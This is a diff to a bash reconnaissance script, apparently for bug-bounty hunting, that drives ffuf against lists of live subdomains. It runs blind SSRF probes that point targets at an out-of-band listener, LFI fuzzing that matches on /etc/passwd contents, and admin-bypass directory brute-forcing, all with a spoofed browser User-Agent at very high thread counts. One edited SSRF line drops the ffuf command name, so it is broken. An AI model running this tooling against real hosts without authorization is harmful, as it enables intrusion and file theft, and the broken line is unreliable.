@@ -448,6 +448,7 @@ custompathlist(){
 
     chown $HOMEUSER: $queryList
     chown $HOMEUSER: $customSsrfQueryList
+    chown $HOMEUSER: $customLfiQueryList
     chown $HOMEUSER: $customSqliQueryList
     echo "Custom queryList done."
   fi
@@ -465,7 +466,7 @@ ssrftest(){
     echo
     # https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt
     echo "[SSRF-2] Blind probe..."
-    xargs -n1 -I {} ffuf -r -t 550 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
+    xargs -n1 -I {} -timeout 4 -mc all -t 1050 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
                          -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
                          -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN \
                          -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
@@ -490,7 +491,7 @@ ssrftest(){
       echo "[SSRF-3] fuzz original endpoints from wayback and fetched data"
       ENDPOINTCOUNT=$(< $TARGETDIR/ssrf-original-list.txt wc -l)
       echo "requests count = $ENDPOINTCOUNT"
-          ffuf -r -c -t 550 -u HOST -w $TARGETDIR/ssrf-original-list.txt:HOST > /dev/null
+          ffuf -timeout 5 -mc all -t 750 -u HOST -w $TARGETDIR/ssrf-original-list.txt:HOST > /dev/null
       echo "[SSRF-3] done."
       echo
       echo "[SSRF-4] fuzz mixed headers with original endpoints from wayback and fetched data"
@@ -505,7 +506,7 @@ ssrftest(){
       echo "HOSTCOUNT=$HOSTCOUNT \t ENDPOINTCOUNT=$ENDPOINTCOUNT"
       echo $(($HOSTCOUNT*$ENDPOINTCOUNT))
 
-          ffuf -t 550 -u HOSTPATH \
+          ffuf -timeout 4 -mc all -t 750 -u HOSTPATH \
               -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
               -w $TARGETDIR/ssrf-list.txt:PATH > /dev/null
       echo "[SSRF-5] done."
@@ -532,7 +533,7 @@ lfitest(){
         #      -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
         #      -o $TARGETDIR/ffuf/lfi-matched-url.txt > /dev/null
     # 2 real life:
-        ffuf -timeout 10 -t 1050 -u HOSTPATH \
+        ffuf -timeout 4 -t 1050 -u HOSTPATH \
              -w $customLfiQueryList:HOST \
              -w $LFIPAYLOAD:PATH \
              -mr "root:[x*]:0:0:" \
@@ -606,7 +607,7 @@ ffufbrute(){
       # gobuster -x append to each word in the selected wordlist
       # gobuster dir -u https://target.com -w ~/wordlist.txt -t 100 -x php,cgi,sh,txt,log,py,jpeg,jpg,png
       # ffuf -c stands for colorized, -s for silent mode
-      interlace --silent -tL $TARGETDIR/3-all-subdomain-live-scheme.txt -threads 20 -c "ffuf -c -u _target_/FUZZ -mc all -fc 300,301,302,303,304,400,403,404,406,500,501,502,503 -fs 0 \-w $customFfufWordList -t $dirsearchThreads -p 0.1-2.0 -recursion -recursion-depth 2 -H \"X-Original-URL: /admin\" -H \"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36\" \-o $TARGETDIR/ffuf/_cleantarget_.html -of html"
+      interlace --silent -tL $TARGETDIR/3-all-subdomain-live-scheme.txt -threads 20 -c "ffuf -timeout 7 -u _target_/FUZZ -mc all -fc 300,301,302,303,304,400,403,404,406,500,501,502,503 -fs 0 \-w $customFfufWordList -t $dirsearchThreads -p 0.1-2.0 -recursion -recursion-depth 2 -H \"X-Original-URL: /admin\" -H \"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36\" \-o $TARGETDIR/ffuf/_cleantarget_.html -of html"
       chown -R $HOMEUSER: $TARGETDIR/ffuf
 }
 
